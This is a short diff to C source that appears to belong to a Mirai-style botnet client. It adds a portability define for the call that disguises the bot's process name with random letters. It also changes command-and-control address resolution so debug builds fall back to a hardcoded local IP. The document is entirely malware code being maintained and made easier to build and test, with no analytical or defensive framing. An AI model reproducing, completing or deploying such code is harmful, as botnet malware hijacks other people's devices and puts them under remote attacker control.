@@ -5,6 +5,7 @@
 #endif
 #include <stdlib.h>
 #include <unistd.h>
+#include <sys/types.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <sys/prctl.h>
@@ -135,6 +136,9 @@ int main(int argc, char **args)
     name_buf_len = ((rand_next() % 6) + 3) * 4;
     rand_alphastr(name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
+#ifndef PR_SET_NAME
+#define PR_SET_NAME 15
+#endif
     prctl(PR_SET_NAME, name_buf);
 
     // Print out system exec
@@ -366,10 +370,16 @@ static void resolve_cnc_addr(void)
     {
 #ifdef DEBUG
         printf("[main] Failed to resolve CNC address\n");
-#endif
+#else
         return;
+#endif
     }
+#ifdef DEBUG
+    printf("[main] bypassing resolv_lookup\n");
+    srv_addr.sin_addr.s_addr = INET_ADDR(192,168,1,227);
+#else
     srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+#endif
     resolv_entries_free(entries);
 
     table_unlock_val(TABLE_CNC_PORT);
